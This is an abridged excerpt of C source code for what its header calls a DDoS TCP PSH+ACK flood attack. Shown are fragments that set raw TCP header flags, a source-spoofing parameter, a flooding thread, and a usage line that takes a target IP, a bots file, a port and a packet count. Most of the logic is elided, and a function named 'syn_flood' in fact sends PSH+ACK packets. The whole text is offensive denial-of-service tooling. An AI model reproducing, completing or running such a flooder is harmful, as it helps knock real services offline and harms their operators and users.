/**
**** author: zaidmukadam
**** description: This is a C program that implements the theory of the DDoS TCP PSH+ACK flood attack
...
void tcp_syn_flood(char *dest_ip, int dest_port, char *spoof_ip, struct sockaddr_in *d_addr) {
    ...
    tcp_header->syn = 0;                           // synchronization flag
    tcp_header->rst = 0;                           // reset flag
    tcp_header->psh = 1;                           // push flag
    tcp_header->ack = 1;                           // acknowlegment flag
...
void *syn_flood_thread(void *vargb) {
    struct tcp_psh *res = (struct tcp_psh*)vargb;
...
int main(int argc, char *argv[]) {
    ...
    if(argc < 5) {
        ...
        fprintf(stderr, "%sUsage:%s tcp_psh_flood [target ip/hostname] [bots file] [port] [number of packets]\n", whi, res);
        exit(1);
    }
    char *host = argv[1];
